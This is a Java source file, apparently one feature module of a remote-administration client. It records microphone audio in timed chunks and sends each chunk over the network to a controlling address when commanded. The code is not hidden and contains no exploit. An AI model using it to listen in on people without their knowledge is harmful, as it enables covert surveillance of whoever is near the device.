package Client.Features;

import Handler.PacketHandler;
import Tools.Network.NetworkInterface;

import javax.sound.sampled.*;
import java.io.IOException;

import static Tools.IConstants.RECORD_TIME;

public class AudioCapture extends Feature {

    private TargetDataLine line;
    private static final  AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
    private static final  Line.Info info = new DataLine.Info(TargetDataLine.class, format);

    public AudioCapture(PacketHandler packetHandler) {
        super(packetHandler);
    }

    @Override
    public void stopFeature() {
        running = false;
    }

    @Override
    public void startFeature() {
        running = true;
        thread.execute(run());
    }

    @Override
    protected Runnable run() {
        return () -> {
            while (running) {
                try {
                    line = (TargetDataLine) AudioSystem.getLine(info);
                    if(line.getFormat().matches(format)){
                        line.open();
                        line.start();

                        AudioInputStream inputStream = new AudioInputStream(line);
                        byte[] data = inputStream.readNBytes((int) (inputStream.getFormat().getFrameSize() * inputStream.getFormat().getFrameRate() * (RECORD_TIME / 1000)));
                        byte[] dataMsg = objectHandler.writeModifiedArray(data, NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE);

                        Thread.sleep(RECORD_TIME);

                        packetHandler.send(dataMsg, dataMsg.length, packetHandler.getAddress(), packetHandler.getPort());
                        inputStream.close();
                    }
                } catch (LineUnavailableException | IOException | InterruptedException e) {
                    e.printStackTrace();
                }
            }
            line.close();
        };
    }

    @Override
    public void disposeAll() {

    }
}
